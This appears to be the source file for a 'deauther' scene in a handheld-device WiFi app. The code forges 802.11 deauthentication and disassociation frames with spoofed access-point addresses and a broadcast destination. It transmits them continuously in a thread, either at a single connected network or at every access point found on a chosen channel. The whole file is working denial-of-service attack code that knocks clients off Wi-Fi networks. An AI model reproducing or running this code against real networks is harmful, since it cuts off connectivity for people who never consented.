#include "../wifi_app.h"
#include "../wifi_hal.h"
#include "../views/deauther_view.h"

#include <esp_wifi.h>
#include <esp_log.h>
#include <string.h>

#define TAG WIFI_APP_LOG_TAG
#define CHANNEL_DEAUTH_MAX_APS 16

static const uint8_t deauth_tmpl[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};
static const uint8_t reasons[] = {0x01, 0x04, 0x06, 0x07, 0x08};

// Frames for single-target (SSID mode)
static uint8_t s_frame_deauth[26];
static uint8_t s_frame_disassoc[26];

// Channel mode: multiple AP targets
static uint8_t s_ch_bssids[CHANNEL_DEAUTH_MAX_APS][6];
static uint8_t s_ch_ap_count = 0;
static uint8_t s_ch_channel = 1;

typedef enum {
    ChDeauthStateIdle,     // selecting channel with Up/Down
    ChDeauthStateScanning, // scan requested, runs in next tick
    ChDeauthStateReady,    // scan done, APs found, ready to start
    ChDeauthStateRunning,  // deauth running
} ChDeauthState;

static ChDeauthState s_ch_state = ChDeauthStateIdle;

static int32_t deauth_thread_fn(void* arg) {
    WifiApp* app = arg;
    uint32_t cycle = 0;

    ESP_LOGI(TAG, "Deauth thread started (mode=%d)", app->deauth_mode);

    while(app->deauth_running) {
        uint8_t reason = reasons[cycle % 5];

        if(app->deauth_mode == WifiAppDeauthModeChannel) {
            if(s_ch_ap_count > 0) {
                uint8_t idx = cycle % s_ch_ap_count;
                uint8_t frame[26];
                memcpy(frame, deauth_tmpl, 26);
                memcpy(&frame[10], s_ch_bssids[idx], 6);
                memcpy(&frame[16], s_ch_bssids[idx], 6);
                frame[24] = reason;

                if(wifi_hal_send_raw(frame, 26)) app->deauth_frame_count++;

                frame[0] = 0xa0; // disassoc
                if(wifi_hal_send_raw(frame, 26)) app->deauth_frame_count++;
            }
        } else {
            s_frame_deauth[24] = reason;
            s_frame_disassoc[24] = reason;
            if(wifi_hal_send_raw(s_frame_deauth, 26)) app->deauth_frame_count++;
            if(wifi_hal_send_raw(s_frame_disassoc, 26)) app->deauth_frame_count++;
        }
        cycle++;
        furi_delay_ms(5);
    }

    ESP_LOGI(TAG, "Deauth thread stopped, %lu frames", (unsigned long)app->deauth_frame_count);
    return 0;
}

static FuriThread* s_deauth_thread = NULL;

static void deauth_do_scan(WifiApp* app) {
    s_ch_ap_count = 0;

    wifi_hal_set_promiscuous(false, NULL);

    wifi_ap_record_t* records = NULL;
    uint16_t count = 0;
    wifi_hal_scan(&records, &count, CHANNEL_DEAUTH_MAX_APS);

    for(int i = 0; i < count && s_ch_ap_count < CHANNEL_DEAUTH_MAX_APS; i++) {
        if(records[i].primary == s_ch_channel) {
            memcpy(s_ch_bssids[s_ch_ap_count], records[i].bssid, 6);
            s_ch_ap_count++;
        }
    }
    free(records);

    ESP_LOGI(TAG, "Channel %d: found %d APs", s_ch_channel, s_ch_ap_count);

    DeautherModel* model = view_get_model(app->view_deauther);
    model->ap_count = s_ch_ap_count;
    model->scanned = true;
    view_commit_model(app->view_deauther, true);

    s_ch_state = (s_ch_ap_count > 0) ? ChDeauthStateReady : ChDeauthStateIdle;
}

void wifi_app_scene_deauther_on_enter(void* context) {
    WifiApp* app = context;

    if(!wifi_hal_is_started()) {
        wifi_hal_start();
    }

    DeautherModel* model = view_get_model(app->view_deauther);
    model->frames_sent = 0;
    model->running = false;
    model->channel_mode = (app->deauth_mode == WifiAppDeauthModeChannel);
    model->ap_count = 0;

    if(app->deauth_mode == WifiAppDeauthModeSsid) {
        WifiApRecord* target = &app->connected_ap;

        memcpy(s_frame_deauth, deauth_tmpl, 26);
        memcpy(&s_frame_deauth[10], target->bssid, 6);
        memcpy(&s_frame_deauth[16], target->bssid, 6);
        memcpy(s_frame_disassoc, s_frame_deauth, 26);
        s_frame_disassoc[0] = 0xa0;

        wifi_hal_disconnect();

        wifi_hal_set_promiscuous(true, NULL);
        wifi_hal_set_channel(target->channel);

        strncpy(model->ssid, target->ssid, 32);
        model->ssid[32] = '\0';
        memcpy(model->bssid, target->bssid, 6);
        model->channel = target->channel;
        s_ch_state = ChDeauthStateReady;
    } else {
        s_ch_channel = 1;
        s_ch_ap_count = 0;
        strcpy(model->ssid, "");
        memset(model->bssid, 0, 6);
        model->channel = s_ch_channel;
        s_ch_state = ChDeauthStateIdle;
    }

    view_commit_model(app->view_deauther, true);

    app->deauth_running = false;
    app->deauth_frame_count = 0;

    view_dispatcher_switch_to_view(app->view_dispatcher, WifiAppViewDeauther);
}

bool wifi_app_scene_deauther_on_event(void* context, SceneManagerEvent event) {
    WifiApp* app = context;
    bool consumed = false;

    if(event.type == SceneManagerEventTypeCustom) {
        if(event.event == InputKeyOk) {
            if(app->deauth_mode == WifiAppDeauthModeChannel) {
                switch(s_ch_state) {
                case ChDeauthStateIdle:
                    // OK = Scan
                    s_ch_state = ChDeauthStateScanning;
                    break;
                case ChDeauthStateReady:
                    // OK = Start deauth
                    app->deauth_running = true;
                    app->deauth_frame_count = 0;
                    s_ch_state = ChDeauthStateRunning;

                    wifi_hal_set_promiscuous(true, NULL);
                    wifi_hal_set_channel(s_ch_channel);

                    s_deauth_thread = furi_thread_alloc();
                    furi_thread_set_name(s_deauth_thread, "Deauth");
                    furi_thread_set_stack_size(s_deauth_thread, 2048);
                    furi_thread_set_context(s_deauth_thread, app);
                    furi_thread_set_callback(s_deauth_thread, deauth_thread_fn);
                    furi_thread_start(s_deauth_thread);
                    break;
                case ChDeauthStateRunning:
                    // OK = Stop deauth
                    app->deauth_running = false;
                    if(s_deauth_thread) {
                        furi_thread_join(s_deauth_thread);
                        furi_thread_free(s_deauth_thread);
                        s_deauth_thread = NULL;
                    }
                    s_ch_state = ChDeauthStateReady;
                    break;
                default:
                    break;
                }
            } else {
                // SSID mode: simple toggle
                if(!app->deauth_running) {
                    app->deauth_running = true;
                    app->deauth_frame_count = 0;

                    s_deauth_thread = furi_thread_alloc();
                    furi_thread_set_name(s_deauth_thread, "Deauth");
                    furi_thread_set_stack_size(s_deauth_thread, 2048);
                    furi_thread_set_context(s_deauth_thread, app);
                    furi_thread_set_callback(s_deauth_thread, deauth_thread_fn);
                    furi_thread_start(s_deauth_thread);
                } else {
                    app->deauth_running = false;
                    if(s_deauth_thread) {
                        furi_thread_join(s_deauth_thread);
                        furi_thread_free(s_deauth_thread);
                        s_deauth_thread = NULL;
                    }
                }
            }
            consumed = true;
        } else if(event.event == InputKeyUp && app->deauth_mode == WifiAppDeauthModeChannel) {
            if(s_ch_state == ChDeauthStateIdle) {
                if(s_ch_channel < 13) s_ch_channel++;
                else s_ch_channel = 1;
                DeautherModel* model = view_get_model(app->view_deauther);
                model->channel = s_ch_channel;
                model->ap_count = 0;
                model->scanned = false;
                view_commit_model(app->view_deauther, true);
            }
            consumed = true;
        } else if(event.event == InputKeyDown && app->deauth_mode == WifiAppDeauthModeChannel) {
            if(s_ch_state == ChDeauthStateIdle) {
                if(s_ch_channel > 1) s_ch_channel--;
                else s_ch_channel = 13;
                DeautherModel* model = view_get_model(app->view_deauther);
                model->channel = s_ch_channel;
                model->ap_count = 0;
                model->scanned = false;
                view_commit_model(app->view_deauther, true);
            }
            consumed = true;
        }
    } else if(event.type == SceneManagerEventTypeTick) {
        // Deferred scan
        if(s_ch_state == ChDeauthStateScanning) {
            deauth_do_scan(app);
        }

        DeautherModel* model = view_get_model(app->view_deauther);
        model->frames_sent = app->deauth_frame_count;
        model->running = app->deauth_running;
        view_commit_model(app->view_deauther, true);
    }

    return consumed;
}

void wifi_app_scene_deauther_on_exit(void* context) {
    WifiApp* app = context;
    app->deauth_running = false;
    s_ch_state = ChDeauthStateIdle;
    if(s_deauth_thread) {
        furi_thread_join(s_deauth_thread);
        furi_thread_free(s_deauth_thread);
        s_deauth_thread = NULL;
    }
    wifi_hal_set_promiscuous(false, NULL);
}
